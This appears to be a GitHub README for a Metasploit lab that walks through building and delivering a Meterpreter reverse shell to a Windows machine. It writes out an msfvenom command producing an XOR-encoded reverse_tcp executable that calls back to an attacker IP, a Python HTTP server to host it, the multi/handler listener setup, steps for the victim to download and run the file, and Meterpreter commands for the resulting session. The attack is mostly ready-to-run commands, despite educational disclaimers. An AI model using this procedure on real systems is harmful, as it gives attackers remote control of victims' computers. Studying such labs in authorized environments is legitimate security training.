# Meterpreter Reverse Shell Lab

![Platform](https://img.shields.io/badge/platform-Kali%20Linux-blue)
![Tool](https://img.shields.io/badge/tool-Metasploit-red)
![Type](https://img.shields.io/badge/type-Reverse%20Shell-orange)
![Purpose](https://img.shields.io/badge/purpose-Cybersecurity%20Lab-green)


This lab demonstrates how a reverse shell payload works using Metasploit.Everything is perofmed in a Virtual and Controlled Environment.

⚠️ This lab is strictly for **educational purposes and authorized testing environments only**.

---

# Lab Environment

Attacker Machine:
Kali Linux

Victim Machine:
Windows 10 / Windows 11

Tools Used:
Metasploit Framework


---

# Step 1 — Generate Payload

Run the following command on Kali Linux:

```
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=<ATTACKER_IP> LPORT=4444 \
-e x64/xor -i 5 \
-f exe -o payload.exe
```

Explanation:

-p → Payload type  
LHOST → Attacker machine IP  
LPORT → Listening port  
-e → Encoder used  
-i → Number of encoding iterations  
-f → Output format  
-o → Output file name

---

# Step 2 — Host Payload File

Start a simple HTTP server to allow the victim machine to download the payload.

```python3 -m http.server 8080```

Your payload will be accessible at:

http://<ATTACKER_IP>:8080/payload.exe

---

# Step 3 — Configure Metasploit Listener

Start Metasploit console:

```msfconsole: 
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp 
set LHOST 192.168.218.128 
set LPORT 4444 
run
```


Metasploit will now wait for an incoming connection.

---

# Step 4 — Execute Payload on Victim Machine

On the Windows machine:

1. Open browser
2. Visit:
   ```
   http://<ATTACKER_IP>:8080/payload.exe
   ```


4. Download the file
5. Execute it

---

# Step 5 — Meterpreter Session

Once the payload runs, you should receive a session in Metasploit.

Example output:

[*] Meterpreter session 1 opened

You can interact with the system using Meterpreter commands.

Example:

sysinfo,
getuid,
pwd,
ls

---

# Attack Flow

Attacker (Kali Linux)

Generate Payload → Host Payload → Start Listener

Victim (Windows)

Download Payload → Execute File

Reverse Connection → Meterpreter Session

---

# Screenshots

## Meterpreter Session

![Meterpreter Session](screenshots/meterpreter-session.png)

# Disclaimer

This project is created for **educational and ethical hacking practice only**.

Do NOT use these techniques on systems without proper authorization.
